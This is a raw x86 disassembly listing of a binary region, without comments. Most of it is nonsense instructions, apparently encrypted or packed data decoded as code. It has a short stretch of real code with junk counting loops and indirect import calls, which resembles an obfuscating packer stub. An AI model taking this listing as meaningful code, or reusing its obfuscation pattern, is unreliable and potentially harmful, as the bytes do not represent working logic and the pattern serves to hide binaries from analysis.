  40a212:	and    DWORD PTR [ebx-0x3efab2c4],0xffffffd2
  40a219:	gs inc edi
  40a21b:	rcl    BYTE PTR [ebx],cl
  40a21d:	mov    al,ds:0x9d2bc746
  40a222:	mov    ebp,0xd4ba197a
  40a227:	sub    ah,BYTE PTR [edi]
  40a229:	mov    bl,0x10
  40a22b:	cmp    eax,0xb4776196
  40a230:	test   eax,0xeb28c8c4
  40a235:	icebp  
  40a236:	shl    BYTE PTR [ecx+0xd],0x61
  40a23a:	repnz mov esi,edx
  40a23d:	mov    dh,0xb
  40a23f:	cmp    DWORD PTR [ecx+0x63],0xffffff82
  40a243:	std    
  40a244:	outs   dx,DWORD PTR ds:[esi]
  40a245:	or     DWORD PTR [edi-0x43532131],ecx
  40a24b:	nop
  40a24c:	mov    al,0x6d
  40a24e:	in     al,dx
  40a24f:	mov    ?,WORD PTR [edx+0x38]
  40a252:	pusha  
  40a253:	adc    BYTE PTR [edx+0x68e1b72a],dh
  40a259:	gs (bad) 
  40a25b:	adc    DWORD PTR [ebp+0x3fbfc35d],edx
  40a261:	sbb    al,0x4b
  40a263:	mov    dh,0x8
  40a265:	sbb    bl,BYTE PTR [ecx]
  40a267:	or     ebp,DWORD PTR ds:0x6051c0d0
  40a26d:	idiv   DWORD PTR [ebx+0x25565b50]
  40a273:	fstp   DWORD PTR [ecx+edx*2+0x1c]
  40a277:	xlat   BYTE PTR ds:[ebx]
  40a278:	sbb    al,0x16
  40a27a:	lods   eax,DWORD PTR ds:[esi]
  40a27b:	and    al,0x91
  40a27d:	data16 xlat BYTE PTR ds:[ebx]
  40a27f:	(bad)  
  40a280:	in     al,0x9e
  40a282:	add    eax,0x7c9e3b7
  40a287:	ret    
  40a288:	arpl   WORD PTR [ebx-0x7164c252],sp
  40a28e:	dec    ebx
  40a28f:	nop
  40a290:	mov    ds:0x7b91137a,eax
  40a295:	jo     0x40a255
  40a297:	es aas 
  40a299:	mov    al,0x25
  40a29b:	jne    0x40a227
  40a29d:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a29f:	stos   DWORD PTR es:[edi],eax
  40a2a0:	lods   al,BYTE PTR ds:[esi]
  40a2a1:	ins    BYTE PTR es:[edi],dx
  40a2a2:	inc    esi
  40a2a3:	nop
  40a2a4:	jns    0x40a2d3
  40a2a6:	gs jp  0x40a323
  40a2a9:	cld    
  40a2aa:	test   BYTE PTR [edx+0x2b],al
  40a2ad:	or     eax,0x26f14318
  40a2b2:	in     al,0x86
  40a2b4:	jp     0x40a288
  40a2b6:	xchg   ebp,eax
  40a2b7:	jbe    0x40a245
  40a2b9:	mov    ebp,0x672c7864
  40a2be:	into   
  40a2bf:	jl     0x40a302
  40a2c1:	mov    bl,0xa3
  40a2c3:	mov    al,cs:0xa0582795
  40a2c9:	bound  ecx,QWORD PTR ds:0xf5ab647a
  40a2cf:	jnp    0x40a2c2
  40a2d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2d2:	ins    DWORD PTR es:[edi],dx
  40a2d3:	daa    
  40a2d4:	pop    edx
  40a2d5:	shl    BYTE PTR [esi+edi*8+0x74],0xee
  40a2da:	std    
  40a2db:	or     ecx,DWORD PTR [esi]
  40a2dd:	aam    0x47
  40a2df:	cli    
  40a2e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2e1:	inc    edx
  40a2e2:	mov    cl,0x48
  40a2e4:	push   0x17bee4f4
  40a2e9:	sbb    eax,0x5d8ad10a
  40a2ee:	mov    ebx,0x1b98e056
  40a2f3:	(bad)  
  40a2f4:	cmp    eax,0x592b20b1
  40a2f9:	cmp    al,cl
  40a2fb:	dec    ebx
  40a2fc:	ja     0x40a319
  40a2fe:	mov    bh,0x7a
  40a300:	sub    BYTE PTR [esi],dh
  40a302:	loope  0x40a2bc
  40a304:	cld    
  40a305:	and    ah,BYTE PTR [ebp-0x52]
  40a308:	xor    al,0x18
  40a30a:	icebp  
  40a30b:	mov    ss,WORD PTR [esi]
  40a30d:	jb     0x40a291
  40a30f:	dec    ebx
  40a310:	jno    0x40a324
  40a312:	stos   BYTE PTR es:[edi],al
  40a313:	push   eax
  40a314:	test   eax,0xe7726dca
  40a319:	mov    bl,BYTE PTR [si-0x558e]
  40a31e:	and    BYTE PTR [ecx],dl
  40a320:	lea    edi,[esi-0x52]
  40a323:	inc    ebx
  40a324:	add    DWORD PTR [esi+0x784ed66c],edx
  40a32a:	mov    dh,0xcc
  40a32c:	jmp    0x9bb64358
  40a331:	add    DWORD PTR [eax],esp
  40a333:	jmp    0x40a302
  40a335:	xchg   BYTE PTR [edi+0x1bc6aefe],bh
  40a33b:	jae    0x40a346
  40a33d:	or     al,0xf
  40a33f:	add    al,BYTE PTR [ebx+0x7890c0da]
  40a345:	xor    DWORD PTR [edi-0x25],esi
  40a348:	das    
  40a349:	xor    ch,al
  40a34b:	xchg   edx,eax
  40a34c:	daa    
  40a34d:	fcmovb st,st(0)
  40a34f:	mov    dh,0x84
  40a351:	ror    edi,cl
  40a353:	jg     0x40a317
  40a355:	inc    ebx
  40a356:	scas   al,BYTE PTR es:[edi]
  40a357:	cwde   
  40a358:	clc    
  40a359:	cmp    eax,DWORD PTR [ecx]
  40a35b:	dec    ebx
  40a35c:	mov    ebp,DWORD PTR [eax]
  40a35e:	add    ebp,DWORD PTR ds:0xc6dd9729
  40a364:	jne    0x40a3e2
  40a366:	addr16 nop
  40a368:	retf   
  40a369:	mov    esp,DWORD PTR [esp-0x2827e30e]
  40a370:	in     al,0xaf
  40a372:	es mov al,0xa2
  40a375:	dec    ebx
  40a376:	(bad)  
  40a377:	fist   WORD PTR [eax+0x19]
  40a37a:	clc    
  40a37b:	push   0x3f1bac06
  40a380:	das    
  40a381:	loopne 0x40a355
  40a383:	dec    edi
  40a384:	xchg   ebp,eax
  40a385:	push   es
  40a386:	es dec edx
  40a388:	jbe    0x40a37e
  40a38a:	and    DWORD PTR ds:0x7aa6d0eb,esp
  40a390:	popa   
  40a391:	imul   edi,DWORD PTR [edx-0x57],0xb7c658
  40a398:	dec    esp
  40a399:	arpl   WORD PTR [ebx-0x7e48ac5a],si
  40a39f:	scas   al,BYTE PTR es:[edi]
  40a3a0:	sbb    al,0x49
  40a3a2:	fmul   st(3),st
  40a3a4:	std    
  40a3a5:	es push es
  40a3a7:	call   0x1cee:0x8f4e4978
  40a3ae:	adc    DWORD PTR [ebx],esi
  40a3b0:	adc    ebp,DWORD PTR [ecx]
  40a3b2:	dec    esi
  40a3b3:	cmp    bh,BYTE PTR [esi+0x58]
  40a3b6:	in     al,0x14
  40a3b8:	jge    0x40a3c8
  40a3ba:	push   ebp
  40a3bb:	loope  0x40a406
  40a3bd:	outs   dx,BYTE PTR ds:[esi]
  40a3be:	sbb    DWORD PTR [esp+ebp*1],0x2426c15a
  40a3c5:	push   0x5a
  40a3c7:	pop    eax
  40a3c8:	mov    eax,ds:0x33ad80d8
  40a3cd:	repnz mov esi,0xb285f632
  40a3d3:	mov    ebx,0x17d5323c
  40a3d9:	xchg   ecx,eax
  40a3da:	adc    esi,DWORD PTR [ebp+0x381fcd21]
  40a3e0:	sti    
  40a3e1:	xor    eax,DWORD PTR [eax-0x55]
  40a3e4:	mov    dh,0x29
  40a3e6:	addr16 aaa 
  40a3e8:	xchg   esi,eax
  40a3e9:	bound  ebp,QWORD PTR [ecx]
  40a3eb:	or     eax,0x427a2fa6
  40a3f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3f1:	add    dh,BYTE PTR [ebx+edx*2+0x31]
  40a3f5:	aaa    
  40a3f6:	add    esi,ecx
  40a3f8:	faddp  st(7),st
  40a3fa:	inc    ebp
  40a3fb:	aam    0x3b
  40a3fd:	test   DWORD PTR [eax+edi*8+0x3ad045c7],ebx
  40a404:	test   DWORD PTR [eax+edi*8+0x45c7ff0b],ebx
  40a40b:	int3   
  40a40c:	cmp    eax,0x1bf89c85
  40a411:	cmp    eax,0x434687
  40a416:	mov    DWORD PTR [ebp-0x38],0xf89c853c
  40a41d:	mov    DWORD PTR ds:0x4345f3,0x13
  40a427:	cmp    DWORD PTR ds:0x4345f3,0x0
  40a42e:	je     0x40a4bc
  40a434:	cmp    DWORD PTR ds:0x4345f3,0x21
  40a43b:	jne    0x40a44c
  40a441:	push   0x43470f
  40a446:	call   DWORD PTR ds:0x413338
  40a44c:	xor    edi,edi
  40a44e:	xor    edi,DWORD PTR ds:0x4345f3
  40a454:	dec    edi
  40a455:	mov    DWORD PTR ds:0x4345f3,edi
  40a45b:	jmp    0x40a427
  40a460:	and    DWORD PTR ds:0x4346fb,0x0
  40a46a:	mov    edx,DWORD PTR ds:0x4346fb
  40a470:	inc    edx
  40a471:	mov    DWORD PTR ds:0x4346fb,edx
  40a477:	cmp    DWORD PTR ds:0x4346fb,0x21
  40a47e:	jne    0x40a4a9
  40a484:	push   0x18fd
  40a489:	push   0x7257
  40a48e:	push   DWORD PTR [ebp-0xc]
  40a491:	push   0x4346b7
  40a496:	push   0x5f6e
  40a49b:	push   DWORD PTR [ebp-0xc]
  40a49e:	push   0x4349a7
  40a4a3:	call   DWORD PTR ds:0x41333c
  40a4a9:	cmp    DWORD PTR ds:0x4346fb,0x15
  40a4b0:	jb     0x40a46a
  40a4b6:	or     DWORD PTR ds:0x43464b,ebx
  40a4bc:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40a4c3:	sbb    edi,0x2ba6
  40a4c9:	mov    edx,DWORD PTR [ebp+0x8]
  40a4cc:	xor    edx,eax
  40a4ce:	sub    DWORD PTR ds:0x434693,ecx
  40a4d4:	mov    edi,DWORD PTR [ebp-0x10]
  40a4d7:	or     DWORD PTR ds:0x434653,0x43464f
  40a4e1:	add    edx,ecx
  40a4e3:	cmp    edi,edx
  40a4e5:	je     0x40e6c9
  40a4eb:	mov    DWORD PTR ds:0x434677,0x7850
  40a4f5:	push   ebx
  40a4f6:	jmp    0x40de76
  40a4fb:	xor    DWORD PTR ds:0x434677,0x535d
  40a505:	mov    edx,DWORD PTR [ebp-0x8]
  40a508:	add    DWORD PTR ds:0x434703,edx
  40a50e:	mov    edi,DWORD PTR [ebp-0x10]
  40a511:	add    DWORD PTR ds:0x4346cb,0x43467b
  40a51b:	sub    edi,edx
  40a51d:	mov    DWORD PTR ds:0x43464f,0x500e
  40a527:	mov    edx,DWORD PTR [ebp-0x4]
  40a52a:	and    DWORD PTR ds:0x43464f,0x1370
  40a534:	xor    edx,eax
  40a536:	add    DWORD PTR ds:0x4345f3,0x35ec
  40a540:	add    edx,ecx
  40a542:	mov    DWORD PTR ds:0x4345fb,0xac0
  40a54c:	cmp    edi,edx
  40a54e:	mov    DWORD PTR ds:0x4346fb,0x5818
  40a558:	jb     0x40e2b1
  40a55e:	mov    ebx,DWORD PTR ds:0x434717
  40a564:	mov    edx,DWORD PTR ds:0x434727
  40a56a:	sub    ebx,edx
  40a56c:	xor    ebx,DWORD PTR [ebx+edx*1]
  40a56f:	mov    edx,DWORD PTR [ebp-0x28]
  40a572:	mov    edi,DWORD PTR [ebp-0x4]
  40a575:	and    DWORD PTR ds:0x43463f,0x0
  40a57f:	mov    ebx,DWORD PTR ds:0x43463f
  40a585:	inc    ebx
  40a586:	mov    DWORD PTR ds:0x43463f,ebx
  40a58c:	cmp    DWORD PTR ds:0x43463f,0x9
  40a593:	jne    0x40a5a2
  40a599:	push   DWORD PTR [ebp-0x20]
  40a59c:	call   DWORD PTR ds:0x413340
  40a5a2:	cmp    DWORD PTR ds:0x43463f,0x8
  40a5a9:	jne    0x40a5bc
  40a5af:	mov    ebx,DWORD PTR ds:0x43463f
  40a5b5:	inc    ebx
  40a5b6:	mov    DWORD PTR ds:0x43463f,ebx
  40a5bc:	cmp    DWORD PTR ds:0x43463f,0x1c
  40a5c3:	jb     0x40a57f
  40a5c9:	xor    edx,eax
  40a5cb:	inc    ebx
  40a5cc:	xor    edi,eax
  40a5ce:	sbb    ebx,DWORD PTR ds:0x43467f
  40a5d4:	add    edi,ecx
  40a5d6:	or     DWORD PTR ds:0x434637,ecx
  40a5dc:	add    edx,ecx
  40a5de:	imul   edx,edi
  40a5e1:	mov    edi,DWORD PTR [ebp-0x8]
  40a5e4:	mov    DWORD PTR ds:0x43464b,0x1b
  40a5ee:	cmp    DWORD PTR ds:0x43464b,0x0
  40a5f5:	je     0x40a629
  40a5fb:	cmp    DWORD PTR ds:0x43464b,0x1d
  40a602:	jne    0x40a611
  40a608:	push   DWORD PTR [ebp-0x10]
  40a60b:	call   DWORD PTR ds:0x413404
  40a611:	mov    ebx,DWORD PTR ds:0x43464b
  40a617:	dec    ebx
  40a618:	mov    DWORD PTR ds:0x43464b,ebx
  40a61e:	jmp    0x40a5ee
  40a623:	and    DWORD PTR ds:0x4346c7,ecx
  40a629:	mov    ebx,DWORD PTR [ebp-0x10]
  40a62c:	sub    ebx,edi
  40a62e:	cmp    ebx,edx
  40a630:	mov    DWORD PTR ds:0x43463f,0x5ce6
  40a63a:	ja     0x40aa85
  40a640:	xor    edx,edx
  40a642:	add    edx,DWORD PTR ds:0x4346bf
  40a648:	add    DWORD PTR ds:0x434713,edx
  40a64e:	mov    edx,DWORD PTR [ebp-0x4]
  40a651:	or     DWORD PTR ds:0x43467f,0x434707
  40a65b:	jmp    0x40aa72
  40a660:	xchg   edx,eax
  40a661:	dec    ebx
  40a662:	in     al,0xe
  40a664:	in     eax,dx
  40a665:	test   eax,0x2c38537c
  40a66a:	out    0x8f,eax
  40a66c:	call   0x7ef2:0xfa92976e
  40a673:	jle    0x40a6e5
  40a675:	jns    0x40a6f5
  40a677:	jle    0x40a68a
  40a679:	aaa    
  40a67a:	pop    ebp
  40a67b:	xchg   esi,eax
  40a67c:	popa   
  40a67d:	ss xchg ebx,eax
  40a67f:	or     dh,bl
  40a681:	mov    esp,0x4d1b5e0c
  40a686:	sub    DWORD PTR [edi-0x6cb5725b],ebx
  40a68c:	imul   DWORD PTR [ebp-0x37cf17b9]
  40a692:	push   ebx
  40a693:	fisttp WORD PTR ds:0x90fa3f9f
  40a699:	fidivr WORD PTR [ecx-0x32]
  40a69c:	xchg   bl,ah
  40a69e:	stos   DWORD PTR es:[edi],eax
  40a69f:	mul    DWORD PTR [edi+0x42]
  40a6a2:	in     al,0x3
  40a6a4:	mov    al,0xd3
  40a6a6:	jl     0x40a69d
  40a6a8:	sbb    cl,ah
  40a6aa:	sbb    DWORD PTR [esi],0xbd3123cc
  40a6b0:	ret    
  40a6b1:	mov    BYTE PTR [ecx+0x14],ah
  40a6b4:	pop    eax
  40a6b5:	pushf  
  40a6b6:	pop    edi
  40a6b7:	ds ret 
  40a6b9:	push   esp
  40a6ba:	xchg   edx,eax
  40a6bb:	call   0x87e0:0x147fa4e
  40a6c2:	cmp    cl,BYTE PTR [ebx]
  40a6c4:	fist   WORD PTR [ebx+0x51]
  40a6c7:	add    al,0xbb
  40a6c9:	in     al,dx
  40a6ca:	into   
  40a6cb:	sub    dl,BYTE PTR [eax+esi*1]
  40a6ce:	out    dx,eax
  40a6cf:	mov    WORD PTR [edx+ecx*4],gs
  40a6d2:	ss cdq 
  40a6d4:	jg     0x40a708
  40a6d6:	and    eax,0x256ba91e
  40a6db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6dc:	inc    edi
  40a6dd:	xor    eax,0x699cf350
  40a6e2:	dec    esp
  40a6e3:	test   al,0xf6
  40a6e5:	scas   eax,DWORD PTR es:[edi]
  40a6e6:	cmp    al,0x51
  40a6e8:	in     eax,0x6d
  40a6ea:	fdiv   st(1),st
  40a6ec:	stc    
  40a6ed:	pop    es
  40a6ee:	ret    0x3080
  40a6f1:	dec    esi
  40a6f2:	xor    BYTE PTR [edx+0x40],ch
  40a6f5:	push   0xa
  40a6f7:	mov    ds,WORD PTR [edi-0x1398b7c9]
  40a6fd:	mov    ebx,edi
  40a6ff:	and    dh,ch
  40a701:	cmp    DWORD PTR [ecx-0x521b5d8a],0x47225a15
  40a70b:	xor    BYTE PTR [edx+0x705d89ef],al
  40a711:	cwde   
  40a712:	gs inc edx
  40a714:	inc    ch
  40a716:	cmp    eax,0x3045a126
  40a71b:	inc    eax
  40a71c:	mov    ds:0x783fc3ef,eax
  40a721:	mov    BYTE PTR [edx],dh
  40a723:	mov    dl,0xb4
  40a725:	ins    DWORD PTR es:[edi],dx
  40a726:	loope  0x40a76b
  40a728:	mov    edx,0xedfbcf1a
  40a72d:	jl     0x40a725
  40a72f:	inc    esi
  40a730:	adc    BYTE PTR [ecx+edi*1-0x7a],al
  40a734:	and    cl,BYTE PTR [ebx]
  40a736:	daa    
  40a737:	add    al,0xea
  40a739:	adc    BYTE PTR [edx+0x24],dl
  40a73c:	sar    DWORD PTR [eax-0x675a3706],1
  40a742:	mov    ebx,0xdef0cf50
  40a747:	dec    edi
  40a748:	out    dx,eax
  40a749:	out    dx,eax
  40a74a:	leave  
  40a74b:	jae    0x40a765
  40a74d:	rcl    eax,1
  40a74f:	add    al,0xa8
  40a751:	loop   0x40a739
  40a753:	lea    esp,[ebx+0x12]
  40a756:	pop    DWORD PTR [esi-0x4d]
  40a759:	lea    edi,[edi+0xb]
  40a75c:	sbb    ecx,DWORD PTR [ecx+esi*8+0x4d]
  40a760:	sub    al,0xa0
  40a762:	push   ebx
  40a763:	and    bl,bl
  40a765:	addr16 or eax,0xe6f2662c
  40a76b:	aaa    
  40a76c:	xchg   esi,eax
  40a76d:	mov    ebp,0xe252b3b6
  40a772:	in     al,dx
  40a773:	inc    esp
  40a774:	addr16 js 0x40a73f
  40a777:	sub    BYTE PTR [edi],0xe7
  40a77a:	fwait
  40a77b:	test   al,0xba
  40a77d:	and    BYTE PTR [ecx+0x28643294],dl
  40a783:	imul   eax,DWORD PTR [edx-0x67a80e59],0x16781804
  40a78d:	out    dx,al
  40a78e:	pushf  
  40a78f:	lahf   
  40a790:	adc    edx,DWORD PTR [ecx-0x30c0632b]
  40a796:	push   edx
  40a797:	push   ecx
  40a798:	je     0x40a7f6
  40a79a:	xchg   ebp,eax
  40a79b:	div    BYTE PTR [ebx]
  40a79d:	lods   al,BYTE PTR ds:[esi]
  40a79e:	retf   0xe4d3
  40a7a1:	test   DWORD PTR [eax-0x25db54ea],ecx
  40a7a7:	and    ah,BYTE PTR [eax]
  40a7a9:	test   BYTE PTR [ebx],ch
  40a7ab:	sar    BYTE PTR [edi-0x29],cl
  40a7ae:	dec    esi
  40a7af:	xchg   ebx,eax
  40a7b0:	hlt    
  40a7b1:	jp     0x40a76e
  40a7b3:	loop   0x40a815
  40a7b5:	sbb    DWORD PTR [esi],0x47b6428d
  40a7bb:	add    dl,BYTE PTR [edx]
  40a7bd:	jb     0x40a75a
  40a7bf:	dec    BYTE PTR [ebp+0x1]
  40a7c2:	in     al,dx
  40a7c3:	xlat   BYTE PTR ds:[ebx]
  40a7c4:	and    DWORD PTR [edi],ebx
  40a7c6:	ss test dl,dl
  40a7c9:	or     BYTE PTR [ebp-0x7a6ae008],dh
  40a7cf:	aad    0xf2
  40a7d1:	retf   
  40a7d2:	fsub   QWORD PTR [ebx-0xd]
  40a7d5:	sbb    dl,BYTE PTR [edi-0x4b76cb15]
  40a7db:	outs   dx,BYTE PTR ds:[esi]
  40a7dc:	test   DWORD PTR [edx-0x4014d84e],ebx
  40a7e2:	fcmovnbe st,st(4)
  40a7e4:	les    ebx,FWORD PTR [ebx-0x57b36573]
  40a7ea:	sahf   
  40a7eb:	shl    DWORD PTR [edi+eax*2+0x58435f14],1
  40a7f2:	leave  
  40a7f3:	cs jmp 0x9ea3d6aa
  40a7f9:	sub    DWORD PTR [esi],0xffffff9b
  40a7fc:	sbb    DWORD PTR [esi],edi
  40a7fe:	ficom  WORD PTR [ecx]
  40a800:	shr    BYTE PTR [ebp+ebx*1-0x3a51076f],cl
  40a807:	int    0xae
  40a809:	fcomp  st(1)
  40a80b:	je     0x40a87e
  40a80d:	addr16 arpl ax,bx
  40a810:	popa   
  40a811:	jbe    0x40a874
  40a813:	pop    ss
  40a814:	mov    ah,0xf4
  40a816:	mov    eax,ds:0x97f3f397
  40a81b:	xchg   edi,eax
  40a81c:	ja     0x40a7a9
  40a81e:	es sti 
  40a820:	pop    ebp
  40a821:	cld    
  40a822:	pop    ebp
  40a823:	call   0x77f31bcf
  40a828:	cmc    
  40a829:	outs   dx,BYTE PTR ds:[esi]
  40a82a:	hlt    
  40a82b:	jbe    0x40a867
  40a82d:	cli    
  40a82e:	loopne 0x40a85d
  40a830:	jae    0x40a7e6
  40a832:	xchg   ebp,eax
  40a833:	push   0x71
  40a835:	xor    bh,bh
  40a837:	lahf   
  40a838:	scas   eax,DWORD PTR es:[edi]
  40a839:	enter  0x1609,0x16
  40a83d:	icebp  
  40a83e:	pusha  
  40a83f:	adc    BYTE PTR [ebx],dh
  40a841:	jmp    0x40a882
  40a843:	jb     0x40a8bf
  40a845:	sub    ecx,ebp
  40a847:	fdivp  st(5),st
  40a849:	retf   0x1014
  40a84c:	(bad)  
  40a84e:	pop    edx
  40a84f:	out    0x23,al
  40a851:	pop    edi
  40a852:	mov    ?,WORD PTR [ecx+esi*1]
  40a855:	and    ebx,DWORD PTR [edi-0x53fb9c3]
  40a85b:	mov    esp,eax
  40a85d:	mov    ds:0x9bfbbe0b,eax
  40a862:	xor    eax,0xc79c4ae5
  40a867:	aam    0x30
  40a869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a86a:	and    al,0x94
  40a86c:	cdq    
  40a86d:	sar    BYTE PTR [ecx+ebx*8+0x6f],1
  40a871:	and    esp,DWORD PTR [ebp-0x47]
  40a874:	fst    DWORD PTR ds:0xdca1f677
  40a87a:	sbb    al,0xdd
  40a87c:	(bad)  
  40a87d:	mov    ebx,0x5dc0cb87
  40a882:	je     0x40a8f5
  40a884:	sub    BYTE PTR [ebx+edi*8+0x2f],dh
  40a888:	aaa    
  40a889:	mov    DWORD PTR [edx+0x6f333e7b],eax
  40a88f:	(bad)  
  40a890:	nop
  40a891:	mov    es,WORD PTR ds:0xb95a69ae
  40a897:	and    bh,BYTE PTR [esi+edi*2-0x1f957bf3]
  40a89e:	in     eax,0xa7
  40a8a0:	xor    DWORD PTR [ebp+0x508c875b],esi
  40a8a6:	lock xor al,0xd9
  40a8aa:	jne    0x40a867
  40a8ac:	sub    edx,DWORD PTR [edi]
  40a8ae:	repnz adc DWORD PTR [eax],0x66984a33
  40a8b5:	jmp    0xf4d81888
  40a8ba:	adc    ah,BYTE PTR [ecx]
  40a8bc:	call   0x6188d9a4
  40a8c1:	sub    al,0x9
  40a8c3:	lahf   
  40a8c4:	inc    esi
  40a8c5:	repz xchg edi,eax
  40a8c7:	or     BYTE PTR [edi-0x5c],dh
  40a8ca:	inc    eax
  40a8cb:	bound  ecx,QWORD PTR [edi+edx*4+0x160e549a]
  40a8d2:	pop    esi
  40a8d3:	push   0x39878073
  40a8d8:	cmp    DWORD PTR [edi-0x7b],ebp
  40a8db:	jne    0x40a873
  40a8dd:	mov    ds:0x21183277,al
  40a8e2:	call   0xb6dc:0x6c695095
  40a8e9:	nop
  40a8ea:	aam    0x1a
  40a8ec:	mov    eax,0xe1a2ac0
  40a8f1:	les    edi,FWORD PTR [esi+0x27]
  40a8f4:	fdivr  st,st(1)
  40a8f6:	fcmovbe st,st(4)
  40a8f8:	test   al,0xc4
  40a8fa:	pop    eax
  40a8fb:	rol    BYTE PTR [edi-0x77],cl
  40a8fe:	dec    ecx
  40a8ff:	idiv   BYTE PTR ds:0x91eb60ef
  40a905:	inc    edx
  40a906:	outs   dx,DWORD PTR ds:[esi]
  40a907:	lahf   
  40a908:	mov    bl,0x55
  40a90a:	test   al,0x3b
  40a90c:	pop    edx
  40a90d:	sbb    eax,0x5043c16e
  40a912:	mov    bh,BYTE PTR [eax]
  40a914:	adc    eax,0xd5c2ae38
  40a919:	imul   edx,edi,0xfffffffa
  40a91c:	(bad)  
  40a91d:	out    dx,al
  40a91e:	xor    edi,edx
  40a920:	sbb    BYTE PTR [edi-0x3b0ec2d3],bh
  40a926:	rcr    BYTE PTR [ecx+0x6f37c682],0xf8
  40a92d:	(bad)  
  40a92e:	scas   eax,DWORD PTR es:[edi]
  40a92f:	pop    ebx
  40a930:	ret    0x2adb
  40a933:	ret    0x292b
  40a936:	int3   
  40a937:	push   cs
  40a938:	lods   al,BYTE PTR ds:[esi]
  40a939:	dec    eax
  40a93a:	or     BYTE PTR [eax-0x31],bh
  40a93d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a93e:	pop    es
  40a93f:	add    edi,DWORD PTR [ecx-0x5d5b4fea]
  40a945:	dec    ecx
  40a946:	retf   
  40a947:	cmp    edx,ecx
  40a949:	rcl    DWORD PTR [edx-0x3231a252],0xff
  40a950:	frstor [ebp+0x15]
  40a953:	imul   ebx,ecx,0x635197ca
  40a959:	loope  0x40a982
  40a95b:	xor    eax,DWORD PTR [esi]
  40a95d:	jmp    0xac2d196
  40a962:	xchg   ebp,eax
  40a963:	sar    BYTE PTR [ecx],cl
  40a965:	repz cmp bl,dl
  40a968:	inc    edi
  40a969:	fld    DWORD PTR ds:[esi-0x27f42979]
  40a970:	lods   eax,DWORD PTR ds:[esi]
  40a971:	xchg   ebp,eax
  40a972:	sbb    DWORD PTR [edx+0x13],esp
  40a975:	rol    DWORD PTR [ebp-0x52],cl
  40a978:	dec    ebp
  40a979:	cmp    ah,0xc7
  40a97c:	das    
  40a97d:	or     BYTE PTR [eax+0x56],0x42
  40a981:	mov    al,BYTE PTR [esi+0x46]
  40a984:	pop    DWORD PTR [edx-0x20]
  40a987:	rol    DWORD PTR [ebp-0x760abbe6],1
  40a98d:	fld    TBYTE PTR [esi-0x572d9b8f]
  40a993:	mov    bl,0x79
  40a995:	sbb    edx,edi
  40a997:	stos   BYTE PTR es:[edi],al
  40a998:	aaa    
  40a999:	jmp    0x40a9e1
  40a99b:	rol    BYTE PTR [ebp-0x22],0x9
  40a99f:	mov    BYTE PTR [ecx],bh
  40a9a1:	fsubr  st(4),st
  40a9a3:	pop    esp
  40a9a4:	cwde   
  40a9a5:	(bad)  
  40a9a6:	fidivr DWORD PTR [edx]
  40a9a8:	and    eax,0x9b319a5b
  40a9ad:	je     0x40a956
  40a9af:	leave  
  40a9b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9b1:	pop    esi
  40a9b2:	sbb    dh,BYTE PTR [edi+0x4d]
  40a9b5:	add    eax,0x4abf8cec
  40a9ba:	stc    
  40a9bb:	push   ebx
  40a9bc:	jne    0x40aa10
  40a9be:	or     DWORD PTR [ebx],eax
  40a9c0:	add    esi,DWORD PTR ds:0xc5ec6141
  40a9c6:	pop    edx
  40a9c7:	add    eax,DWORD PTR [ebx]
  40a9c9:	push   ecx
  40a9ca:	adc    dl,bl
  40a9cc:	out    0xcb,al
  40a9ce:	(bad)  
  40a9cf:	push   DWORD PTR [ebp+0x49]
  40a9d2:	loop   0x40a956
  40a9d4:	shl    ebp,cl
  40a9d6:	adc    cl,BYTE PTR [edi-0x3e05a3fc]
  40a9dc:	leave  
  40a9dd:	fdiv   DWORD PTR [edx+0x3e]
  40a9e0:	in     eax,dx
  40a9e1:	les    eax,FWORD PTR [ebp+0x27]
  40a9e4:	addr16 ss out dx,al
  40a9e7:	mov    ebp,0x1d3f6176
  40a9ec:	mov    ss,ebx
  40a9ee:	jae    0x40a97f
  40a9f0:	push   cs
  40a9f1:	pop    ebx
  40a9f2:	fisub  WORD PTR [ebp-0x6398fa61]
  40a9f8:	lahf   
  40a9f9:	push   edx
  40a9fa:	push   esp
  40a9fb:	repz xlat BYTE PTR ds:[ebx]
  40a9fd:	adc    al,0xe3
  40a9ff:	and    dl,BYTE PTR [esp+eax*1-0x61]
  40aa03:	inc    esi
  40aa04:	and    eax,0xe9d6758f
  40aa09:	pop    esi
  40aa0a:	outs   dx,BYTE PTR ds:[esi]
  40aa0b:	push   esp
  40aa0c:	(bad)  
  40aa0d:	jmp    0x40aa49
  40aa0f:	add    eax,0x3f882a4
  40aa14:	xor    DWORD PTR [edi+0x542bfca5],ecx
  40aa1a:	mov    ds:0x1ad0f203,al
  40aa1f:	rep ins BYTE PTR es:[edi],dx
  40aa21:	sahf   
  40aa22:	sti    
  40aa23:	mov    ds:0xf7e2974d,al
  40aa28:	mov    eax,0x638c0eb2
  40aa2d:	pop    eax
  40aa2e:	push   ss
  40aa2f:	call   0x4e88ad48
  40aa34:	(bad)  
  40aa35:	repz inc ecx
  40aa37:	or     cl,BYTE PTR [ebp+0x61a5f33]
  40aa3d:	xor    eax,edx
  40aa3f:	in     al,dx
  40aa40:	cmp    al,0xce
  40aa42:	aaa    
  40aa43:	xor    DWORD PTR [ebx-0x80],0x31fb32d7
  40aa4a:	scas   eax,DWORD PTR es:[edi]
  40aa4b:	cdq    
  40aa4c:	je     0x40aa10
  40aa4e:	loope  0x40aa46
  40aa50:	inc    ecx
  40aa51:	retf   0xd3e2
  40aa54:	push   edx
  40aa55:	dec    eax
  40aa56:	repnz sbb bl,BYTE PTR [ecx+edi*1]
  40aa5a:	pop    es
  40aa5b:	lds    esp,FWORD PTR [edx+0x6bc853bb]
  40aa61:	dec    esi
  40aa62:	and    DWORD PTR [esi+0x5332cb3],esi
  40aa68:	sahf   
  40aa69:	lods   al,BYTE PTR ds:[esi]
  40aa6a:	adc    al,0xca
  40aa6c:	and    DWORD PTR [eax-0x1336b0bb],esi
  40aa72:	xor    edx,eax
  40aa74:	adc    DWORD PTR ds:0x434653,0x43467f
  40aa7e:	add    edx,ecx
  40aa80:	jmp    0x40c4f6
  40aa85:	mov    edx,DWORD PTR [ebp-0x2c]
